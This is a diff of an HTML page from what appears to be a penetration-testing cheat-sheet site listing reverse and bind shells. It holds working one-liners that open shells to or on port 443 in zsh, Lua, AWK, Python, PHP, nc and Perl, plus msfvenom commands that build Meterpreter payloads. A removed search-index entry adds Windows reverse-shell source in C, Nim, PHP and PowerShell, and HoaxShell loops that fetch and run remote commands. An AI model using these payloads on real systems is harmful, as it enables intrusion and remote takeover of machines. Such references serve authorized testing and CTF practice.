   <code>zsh -c &#39;zmodload zsh/net/tcp &amp;&amp; ztcp 10.10.10.10 443 &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY&#39;</code>
-  </pre></div><hr><h3 id=lua>Lua <a href=#lua class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=d153311 class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="lua">Lua <a href="#lua" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="d153311" class="language-bash ">
   <code>lua -e &#34;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;10.10.10.10&#39;,&#39;443&#39;);os.execute(&#39;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&#34;</code>
-  </pre></div><div class=prism-codeblock><pre id=ad5656e class=language-bash>
+  </pre>
+  </div>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="ad5656e" class="language-bash ">
   <code>lua5.1 -e &#39;local host, port = &#34;10.10.10.10&#34;, 443 local socket = require(&#34;socket&#34;) local tcp = socket.tcp() local io = require(&#34;io&#34;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &#34;r&#34;) local s = f:read(&#34;*a&#34;) f:close() tcp:send(s) if status == &#34;closed&#34; then break end end tcp:close()&#39;</code>
-  </pre></div><hr><h3 id=awk>AWK <a href=#awk class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=27eefa2 class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="awk">AWK <a href="#awk" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="27eefa2" class="language-bash ">
   <code>awk &#39;BEGIN {s = &#34;/inet/tcp/0/10.10.10.10/443&#34;; while(42) { do{ printf &#34;shell&gt;&#34; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &#34;exit&#34;) close(s); }}&#39; /dev/null</code>
-  </pre></div><hr><h3 id=dart>Dart <a href=#dart class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=0300c1c class=language-dart>
+  </pre>
+  </div>
+<hr>
+<h3 id="dart">Dart <a href="#dart" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="0300c1c" class="language-dart ">
   <code>import &#39;dart:io&#39;;
 import &#39;dart:convert&#39;;
 
@@ -466,33 +1322,332 @@ main() {
     });
   });
 }</code>
-  </pre></div><hr><h2 id=bind>Bind <a href=#bind class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><hr><h3 id=python-1>Python <a href=#python-1 class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=f965d02 class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h2 id="bind">Bind <a href="#bind" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><hr>
+<h3 id="python-1">Python <a href="#python-1" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="f965d02" class="language-bash ">
   <code>python3 -c &#39;exec(&#34;&#34;&#34;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((&#34;0.0.0.0&#34;,443));s1.listen(1);c,a=s1.accept();
 while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()&#43;p.stderr.read())&#34;&#34;&#34;)&#39;</code>
-  </pre></div><hr><h3 id=php-1>PHP <a href=#php-1 class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=2301a41 class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="php-1">PHP <a href="#php-1" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="2301a41" class="language-bash ">
   <code>php -r &#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,&#34;0.0.0.0&#34;,443);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,&#34;$ &#34;,2))exit;$in=socket_read($cl,100);$cmd=popen(&#34;$in&#34;,&#34;r&#34;);while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}&#39;</code>
-  </pre></div><hr><h3 id=nc-1>NC <a href=#nc-1 class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=a094d51 class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="nc-1">NC <a href="#nc-1" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="a094d51" class="language-bash ">
   <code>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -l 0.0.0.0 443 &gt; /tmp/f</code>
-  </pre></div><hr><h3 id=perl-1>Perl <a href=#perl-1 class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=f10ed6b class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="perl-1">Perl <a href="#perl-1" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="f10ed6b" class="language-bash ">
   <code>perl -e &#39;use Socket;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,&#34;&gt;&amp;C&#34;);open(STDOUT,&#34;&gt;&amp;C&#34;);open(STDERR,&#34;&gt;&amp;C&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</code>
-  </pre></div><hr><h2 id=metasploit>Metasploit <a href=#metasploit class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><hr><h3 id=linux-meterpreter-staged>Linux Meterpreter Staged <a href=#linux-meterpreter-staged class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=cbec7b8 class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h2 id="metasploit">Metasploit <a href="#metasploit" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><hr>
+<h3 id="linux-meterpreter-staged">Linux Meterpreter Staged <a href="#linux-meterpreter-staged" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="cbec7b8" class="language-bash ">
   <code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f elf -o reverse.elf</code>
-  </pre></div><hr><h3 id=linux-meterpreter-stageless>Linux Meterpreter Stageless <a href=#linux-meterpreter-stageless class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=71f3bd6 class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="linux-meterpreter-stageless">Linux Meterpreter Stageless <a href="#linux-meterpreter-stageless" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="71f3bd6" class="language-bash ">
   <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f elf -o reverse.elf</code>
-  </pre></div><hr><h3 id=php-meterpreter-stageless>PHP Meterpreter Stageless <a href=#php-meterpreter-stageless class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=5e86925 class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="php-meterpreter-stageless">PHP Meterpreter Stageless <a href="#php-meterpreter-stageless" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="5e86925" class="language-bash ">
   <code>msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw -o shell.php</code>
-  </pre></div><hr><h3 id=reverse-php>Reverse PHP <a href=#reverse-php class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=bd11519 class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="reverse-php">Reverse PHP <a href="#reverse-php" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="bd11519" class="language-bash ">
   <code>msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=443 -o shell.php</code>
-  </pre></div><hr><h3 id=jsp-stageless>JSP Stageless <a href=#jsp-stageless class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=9058270 class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="jsp-stageless">JSP Stageless <a href="#jsp-stageless" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="9058270" class="language-bash ">
   <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw -o shell.jsp</code>
-  </pre></div><hr><h3 id=war-stageless-reverse>War Stageless Reverse <a href=#war-stageless-reverse class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=c9f0187 class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="war-stageless-reverse">War Stageless Reverse <a href="#war-stageless-reverse" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="c9f0187" class="language-bash ">
   <code>msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f war -o shell.war</code>
-  </pre></div><hr><h3 id=python-stageless-reverse>Python Stageless Reverse <a href=#python-stageless-reverse class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=7a1335a class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="python-stageless-reverse">Python Stageless Reverse <a href="#python-stageless-reverse" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="7a1335a" class="language-bash ">
   <code>msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=443 -f raw</code>
-  </pre></div><hr><h3 id=bash-stageless-reverse>Bash Stageless Reverse <a href=#bash-stageless-reverse class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=5db1ac3 class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="bash-stageless-reverse">Bash Stageless Reverse <a href="#bash-stageless-reverse" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="5db1ac3" class="language-bash ">
   <code>msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=443 -f raw -o shell.sh</code>
-  </pre></div></div></div><div><hr class=doc-hr><div id=doc-nav class=d-print-none><div class="row flex-xl-nowrap flex-row-reverse"><div class="col-sm-6 pt-2 doc-prev"><a class=ms-auto href=/docs/reconnaissance/portscan/><div class="card h-100 my-1 text-end"><div class="card-body py-2"><p class="card-title fs-5 fw-semibold lh-base mb-0">Portscan <i class="material-icons align-middle">navigate_next</i></p><p class="card-text me-2"></p></div></div></a></div></div></div></div></div></div></div></div><footer class="shadow py-3 d-print-none"><div class=container-fluid><div class="row align-items-center"><div class=col><div class="text-sm-start text-center mx-md-2"><p class=mb-0>© 2023 0X53 <em>[5105]</em></p></div></div></div></div></footer></main></div></div><button onclick=topFunction() id=back-to-top aria-label="Back to Top Button" class="back-to-top fs-5"><svg width="24" height="24"><path d="M12 10.224l-6.3 6.3-1.38-1.372L12 7.472l7.68 7.68-1.38 1.376z" style="fill:#fff"/></svg></button>
-<script>(()=>{var e=document.getElementById("mode");e!==null&&(window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",e=>{e.matches?(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")):(localStorage.setItem("theme","light"),document.documentElement.removeAttribute("data-dark-mode"))}),e.addEventListener("click",()=>{document.documentElement.toggleAttribute("data-dark-mode"),localStorage.setItem("theme",document.documentElement.hasAttribute("data-dark-mode")?"dark":"light")}),localStorage.getItem("theme")==="dark"?document.documentElement.setAttribute("data-dark-mode",""):document.documentElement.removeAttribute("data-dark-mode"))})()</script><script src=/docs/js/bootstrap.437f5ca5da0b6cecae9e04d4737f6009d4d5dfaebc8e02c5bea7af57ca501a12f43d5c36bb007c5253f094be16f10b83.js integrity=sha384-Q39cpdoLbOyungTUc39gCdTV3668jgLFvqevV8pQGhL0PVw2uwB8UlPwlL4W8QuD defer></script><script type=text/javascript src=https://documentnation.github.io/docs/js/bundle.min.7a4d9a20bcaba6e214f975ee4e2dd0310f722c15b279ed19e019bdf87ecd1113c1723f24169c3aeeec2669a236aaed1a.js integrity=sha384-ek2aILyrpuIU+XXuTi3QMQ9yLBWyee0Z4Bm9+H7NERPBcj8kFpw67uwmaaI2qu0a crossorigin=anonymous defer></script><script type=module>
+  </pre>
+  </div>
+
+    </div>
+
+    
+
+    
+                                            </div>
+                                            <div><hr class="doc-hr">
+<div id="doc-nav" class="d-print-none">
+
+	<div class="row flex-xl-nowrap flex-row-reverse">
+	<div class="col-sm-6 pt-2 doc-prev">
+		<a class="ms-auto" href="/docs/reconnaissance/portscan/">
+			<div class="card h-100 my-1 text-end">
+				<div class="card-body py-2">
+                    <p class="card-title fs-5 fw-semibold lh-base mb-0">Portscan <i class="material-icons align-middle">navigate_next</i></p>
+					<p class="card-text me-2"></p>
+					
+				</div>
+			</div>
+		</a>
+        </div>
+	</div>
+</div></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+<footer class="shadow py-3 d-print-none">
+    <div class="container-fluid">
+        <div class="row align-items-center">
+            <div class="col">
+                <div class="text-sm-start text-center mx-md-2">
+                    <p class="mb-0">
+                        
+                        © 2024 0X53 <em>[5105]</em>
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</main>
+            </div>
+        </div>
+
+        
+        
+        <button onclick="topFunction()" id="back-to-top" aria-label="Back to Top Button" class="back-to-top fs-5"><svg width="24" height="24"><path d="M12,10.224l-6.3,6.3L4.32,15.152,12,7.472l7.68,7.68L18.3,16.528Z" style="fill:#fff"/></svg></button>
+        
+        
+
+        
+        
+            <script>(()=>{var e=document.getElementById("mode");e!==null&&(window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",e=>{e.matches?(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")):(localStorage.setItem("theme","light"),document.documentElement.removeAttribute("data-dark-mode"))}),e.addEventListener("click",()=>{document.documentElement.toggleAttribute("data-dark-mode"),localStorage.setItem("theme",document.documentElement.hasAttribute("data-dark-mode")?"dark":"light")}),localStorage.getItem("theme")==="dark"?document.documentElement.setAttribute("data-dark-mode",""):document.documentElement.removeAttribute("data-dark-mode"))})()</script>
+        
+
+
+
+
+    
+        
+        
+    
+    
+
+
+
+
+
+
+    
+
+    <script src="/docs/js/bootstrap.9bf1a2680076ecb3d5bf761d03e44316ea1546765dad06843315f94e5fd5d8e2257f2417a68c98561e887bfeac9556c9.js" integrity="sha384-m/GiaAB27LPVv3YdA&#43;RDFuoVRnZdrQaEMxX5Tl/V2OIlfyQXpoyYVh6Ie/6slVbJ"defer></script>
+
+
+    <script type="text/javascript" src="https://documentnation.github.io/docs/js/bundle.min.76367c4b25f6d7f9df76ace8d8af690215e4aa3a790c071c79511d15d04b79127fa1e6a6e35c2bcaee420fbff212d5dd.js" integrity="sha384-djZ8SyX21/nfdqzo2K9pAhXkqjp5DAcceVEdFdBLeRJ/oeam41wryu5CD7/yEtXd" crossorigin="anonymous" defer></script>
+        
+
+        
+        <script type="module">
     var suggestions = document.getElementById('suggestions');
     var search = document.getElementById('flexsearch');
 
@@ -651,13 +1806,6 @@ while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stder
     
     
     
-    
-    
-    
-    
-    
-    
-    
 
 
     
@@ -688,7 +1836,7 @@ while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stder
                 href: "\/docs\/reconnaissance\/portscan\/",
                 title: "Portscan",
                 description: "Port Specification Options link Switch/Flag Example Description -p nmap -p 21 127.0.0.1 Scanning Specific Port -p nmap -p 21-100 127.0.0.1 Scanning Specific Port Range -sU sudo nmap -sU 110 127.0.0.1 UDP Port Scanning -p- nmap -p- 127.0.0.1 All Port Scanning -F nmap -F 127.0.0.1 Fast mode - Scan fewer ports than the default scan Port Scanning Types link Switch/Flag Example Description -sS nmap -sS 127.0.0.1 TCP SYN Scan -sT nmap -sT 127.",
-                content: " Port Specification Options link Switch/Flag Example Description -p nmap -p 21 127.0.0.1 Scanning Specific Port -p nmap -p 21-100 127.0.0.1 Scanning Specific Port Range -sU sudo nmap -sU 110 127.0.0.1 UDP Port Scanning -p- nmap -p- 127.0.0.1 All Port Scanning -F nmap -F 127.0.0.1 Fast mode - Scan fewer ports than the default scan Port Scanning Types link Switch/Flag Example Description -sS nmap -sS 127.0.0.1 TCP SYN Scan -sT nmap -sT 127.0.0.1 TCP Connect Scan -sA sudo nmap -sA 127.0.0.1 TCP ACK Scan -sU sudo nmap -sU 127.0.0.1 UDP Port Scan -sX sudo nmap -sX 127.0.0.1 TCP Xmas Scan -sn nmap -sn 127.0.0.1 Ping Scan -sU sudo nmap -sU 127.0.0.1 UDP Port Scan Update Nmap Script Engine Scripts [NSE Scripts] link sudo nmap --script-updatedb Automated Bash Script linkThis script utilizes rustscan for faster scanning.\n#!/bin/bash if [ \"$#\" -ne 1 ]; then echo \"Usage: ports HOST\" exit 2 fi nmap -p- --min-rate 1000 $1 -oN all_ports -vvv -Pn ports=$(grep -iv not all_ports | grep -i 'open\\|filtered' | awk -F'/' '{ print $1 }' ORS=',') rustscan --ulimit 5000 -a $1 -p $ports -- -Pn -A --script vuln -oN nmap rm ./all_ports "
+                content: " Port Specification Options link Switch/Flag Example Description -p nmap -p 21 127.0.0.1 Scanning Specific Port -p nmap -p 21-100 127.0.0.1 Scanning Specific Port Range -sU sudo nmap -sU 110 127.0.0.1 UDP Port Scanning -p- nmap -p- 127.0.0.1 All Port Scanning -F nmap -F 127.0.0.1 Fast mode - Scan fewer ports than the default scan Port Scanning Types link Switch/Flag Example Description -sS nmap -sS 127.0.0.1 TCP SYN Scan -sT nmap -sT 127.0.0.1 TCP Connect Scan -sA sudo nmap -sA 127.0.0.1 TCP ACK Scan -sU sudo nmap -sU 127.0.0.1 UDP Port Scan -sX sudo nmap -sX 127.0.0.1 TCP Xmas Scan -sn nmap -sn 127.0.0.1 Ping Scan -sU sudo nmap -sU 127.0.0.1 UDP Port Scan Update Nmap Script Engine Scripts [NSE Scripts] link sudo nmap --script-updatedb Automated Bash Script linkThis script utilizes rustscan for faster scanning.\n#!/bin/bash if [ \"$#\" -ne 1 ]; then echo \"Usage: ports HOST\" exit 2 fi nmap -p- --min-rate 1000 $1 -oN all_ports -vvv -Pn ports=$(grep -iv not all_ports | grep -i 'open\\|filtered' | awk -F'/' '{ print $1 }' ORS=',') rustscan --ulimit 5000 -a $1 -p $ports -- -Pn -A --script vuln -oN nmap rm ./all_ports Rustscan link rustscan -a 127.0.0.1 "
             }
         );
     index.add(
@@ -703,15 +1851,6 @@ while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stder
     index.add(
             {
                 id:  4 ,
-                href: "\/docs\/shells\/windows\/",
-                title: "Windows",
-                description: "Reverse link Nim link proc exe(c: string): string = result = execProcess(\"cm\" \u0026 \"d /c \" \u0026 c) var v = newSocket() # Change this v1 = \"10.10.10.10\" v2 = \"443\" s4 = \"Exiting..\" s5 = \"cd\" s6 = \"C:\\\\\" try: v.connect(v1, Port(parseInt(v2))) while true: v.send(os.getCurrentDir() \u0026 \"\u003e \") let c = v.recvLine() if c == \"exit\": v.send(s4) break if c.strip() == s5: os.setCurrentDir(s6) elif c.strip().startswith(s5): let d = c.",
-                content: " Reverse link Nim link proc exe(c: string): string = result = execProcess(\"cm\" \u0026 \"d /c \" \u0026 c) var v = newSocket() # Change this v1 = \"10.10.10.10\" v2 = \"443\" s4 = \"Exiting..\" s5 = \"cd\" s6 = \"C:\\\\\" try: v.connect(v1, Port(parseInt(v2))) while true: v.send(os.getCurrentDir() \u0026 \"\u003e \") let c = v.recvLine() if c == \"exit\": v.send(s4) break if c.strip() == s5: os.setCurrentDir(s6) elif c.strip().startswith(s5): let d = c.strip().split(' ')[1] try: os.setCurrentDir(d) except OSError as b: v.send(repr(b) \u0026 \"\\n\") continue else: let r = exe(c) v.send(r) except: raise finally: v.close nim c -d:mingw --app:gui --opt:speed rev.nim Nc.exe link nc.exe 10.10.10.10 443 -e sh C link #include #include #pragma comment(lib,\"ws2_32\") WSADATA wsaData; SOCKET Winsock; struct sockaddr_in hax; char ip_addr[16] = \"10.10.10.10\"; char port[6] = \"443\"; STARTUPINFO ini_processo; PROCESS_INFORMATION processo_info; int main() { WSAStartup(MAKEWORD(2, 2), \u0026wsaData); Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); struct hostent *host; host = gethostbyname(ip_addr); strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host-\u003eh_addr))); hax.sin_family = AF_INET; hax.sin_port = htons(atoi(port)); hax.sin_addr.s_addr = inet_addr(ip_addr); WSAConnect(Winsock, (SOCKADDR*)\u0026hax, sizeof(hax), NULL, NULL, NULL, NULL); memset(\u0026ini_processo, 0, sizeof(ini_processo)); ini_processo.cb = sizeof(ini_processo); ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock; TCHAR cmd[255] = TEXT(\"cmd.exe\"); CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, \u0026ini_processo, \u0026processo_info); return 0; } PHP link \u003c?php set_time_limit (0); $VERSION = \"1.0\"; $ip = '10.10.10.10'; $port = 443; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; sh -i'; $daemon = 0; $debug = 0; if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == -1) { printit(\"ERROR: Can't fork\"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(\"Error: Can't setsid()\"); exit(1); } $daemon = 1; } else { printit(\"WARNING: Failed to daemonise. This is quite common and not fatal.\"); } chdir(\"/\"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\"$errstr ($errno)\"); exit(1); } $descriptorspec = array( 0 =\u003e array(\"pipe\", \"r\"), 1 =\u003e array(\"pipe\", \"w\"), 2 =\u003e array(\"pipe\", \"w\") ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) { if (feof($sock)) { printit(\"ERROR: Shell connection terminated\"); break; } if (feof($pipes[1])) { printit(\"ERROR: Shell process terminated\"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \"$string\\n\"; } } ?\u003e Powershell link $LHOST = \"10.10.10.10\"; $LPORT = 443; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2\u003e\u00261 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close() echo -n | iconv -t utf-16le | base64 -w 0 powershell -encodedcommand Grooby link String host=\"10.10.10.10\";int port=443;String cmd=\"sh\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()\u003e0)so.write(pi.read());while(pe.available()\u003e0)so.write(pe.read());while(si.available()\u003e0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); Metasploit link Windows Meterpreter Staged link msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o reverse.exe Windows Meterpreter Stageless link msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o reverse.exe Windows Shell Staged link msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o reverse.exe Windows Shell Stageless link msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o reverse.exe Bind Shellcode link msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '' -f python -v notBuf -o shellcode PHP Meterpreter Stageless link msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw -o shell.php Reverse PHP link msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=443 -o shell.php JSP Stageless link msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw -o shell.jsp War Stageless Reverse link msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f war -o shell.war HoaxShell link CMD Curl link @echo off\u0026cmd /V:ON /C \"SET ip=10.10.10.10:443\u0026\u0026SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"\u0026\u0026SET protocol=http://\u0026\u0026curl !protocol!!ip!/eb6a44aa -H !sid! \u003e NUL \u0026\u0026 for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! \u003e !temp!cmd.bat \u0026 type !temp!cmd.bat | findstr None \u003e NUL \u0026 if errorlevel 1 ((!temp!cmd.bat \u003e !tmp!out.txt 2\u003e\u00261) \u0026 curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt \u003e NUL)) \u0026 timeout 1\" \u003e NUL Powershell IEX link $s='10.10.10.10:443';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{\"Authorization\"=$i} -Body 